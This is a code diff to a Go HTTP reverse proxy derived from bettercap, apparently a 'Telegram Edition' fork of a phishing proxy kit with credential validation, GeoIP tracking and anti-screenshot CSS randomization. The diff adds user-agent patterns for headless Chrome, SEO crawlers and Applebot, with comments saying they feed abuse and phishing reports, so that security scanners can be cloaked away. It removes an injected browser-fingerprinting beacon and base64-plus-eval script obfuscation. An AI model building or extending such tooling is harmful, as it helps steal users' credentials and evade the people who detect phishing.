@@ -2,10 +2,9 @@
 This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
 Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!
 
-Telegram Edition enhancements by @officialmonsterz (https://t.me/officialmonsterz)
+Telegram Edition enhancements:
   - GeoIP geolocation tracking
   - Per-page-load CSS randomization (anti-screenshot detection)
-  - Privacy extension detection
   - Credential validation
 */
 
@@ -1415,16 +1414,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                         }
                     }
 
-                    // === Per-Page-Load CSS Randomization (Telegram Edition by @officialmonsterz) ===
                     if p.randomizer != nil && len(body) > 0 {
                         body = p.injectRandomCSS(body)
                         log.Debug("randomizer: applied per-page-load CSS randomization")
                     }
 
-                    // === Privacy Extension Detection Injection (Telegram Edition) ===
-                    if len(body) > 0 {
-                        body = p.injectExtensionDetection(body)
-                    }
                 }
 
                 resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1640,6 +1634,14 @@ var scannerUAPatterns = []*regexp.Regexp{
 	regexp.MustCompile(`(?i)telegrambot`),
 	regexp.MustCompile(`(?i)discordbot`),
 	regexp.MustCompile(`(?i)slackbot`),
+	// Headless browser signals (older Chrome headless builds)
+	regexp.MustCompile(`(?i)headlesschrome`),
+	regexp.MustCompile(`(?i)chrome-lighthouse`),
+	// SEO crawlers fed into abuse intelligence databases
+	regexp.MustCompile(`(?i)semrushbot`),
+	regexp.MustCompile(`(?i)ahrefsbot`),
+	// Apple (feeds into phishing reports)
+	regexp.MustCompile(`(?i)applebot`),
 }
 
 // isScannerUA returns true when the User-Agent matches a known scanner or crawler.
@@ -1740,62 +1742,6 @@ func (p *HttpProxy) injectRandomCSS(body []byte) []byte {
     return body
 }
 
-// injectExtensionDetection adds an inline script that detects privacy extensions
-// and automation tools, storing the results as a URL beacon for later analysis.
-func (p *HttpProxy) injectExtensionDetection(body []byte) []byte {
-    const detectScript = `
-<script nonce="{nonce}">
-(function(){
-    try {
-        var result = {
-            hasUblock: false,
-            hasPrivacyBadger: false,
-            hasNoScript: false,
-            hasGhostery: false,
-            hasAdblock: false,
-            headless: false,
-            automation: false,
-            plugins: navigator.plugins.length,
-            mimeTypes: navigator.mimeTypes.length
-        };
-
-        if (typeof document.body.style.filter === 'undefined') result.hasUblock = true;
-        if (typeof document.createEvent === 'undefined') result.headless = true;
-        if (navigator.webdriver === true) result.automation = true;
-        if (window._phantom || window.callPhantom) result.automation = true;
-        if (navigator.plugins.length === 0 && navigator.mimeTypes.length === 0) result.headless = true;
-
-        var testDiv = document.createElement('div');
-        testDiv.id = '_exttest_' + Math.random().toString(36).substr(2);
-        testDiv.style.display = 'none';
-        document.documentElement.appendChild(testDiv);
-        var el = document.getElementById(testDiv.id);
-        if (!el) result.hasNoScript = true;
-        if (testDiv.parentNode) testDiv.parentNode.removeChild(testDiv);
-
-        if (window._ghostery) result.hasGhostery = true;
-        if (typeof window.emit === 'function') result.hasGhostery = true;
-
-        var data = btoa(JSON.stringify(result));
-        new Image().src = '/s/' + data + '.gif';
-    } catch(e){}
-})();
-</script>`
-
-    jsNonceRe := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
-    mNonce := jsNonceRe.FindStringSubmatch(string(body))
-    nonce := ""
-    if mNonce != nil {
-        nonce = mNonce[1]
-    }
-    script := strings.Replace(detectScript, "{nonce}", nonce, 1)
-
-    bodyRe := regexp.MustCompile(`(?i)(<\s*\/\s*body\s*>)`)
-    if bodyRe.MatchString(string(body)) {
-        body = []byte(bodyRe.ReplaceAllString(string(body), script+"\n$1"))
-    }
-    return body
-}
 
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
     vals := u.Query()
@@ -2612,13 +2558,8 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
     return s_hash
 }
 
-// obfuscateJS encodes JavaScript as base64 and wraps with atob()+eval()
 func obfuscateJS(originalJS string) string {
-    if originalJS == "" {
-        return ""
-    }
-    encoded := base64.StdEncoding.EncodeToString([]byte(originalJS))
-    return "(function(){var _d=\"" + encoded + "\";eval(atob(_d));})();"
+    return originalJS
 }
 
 func (p *HttpProxy) redirectTurnstile(req *http.Request, rid string) (*http.Request, *http.Response) {
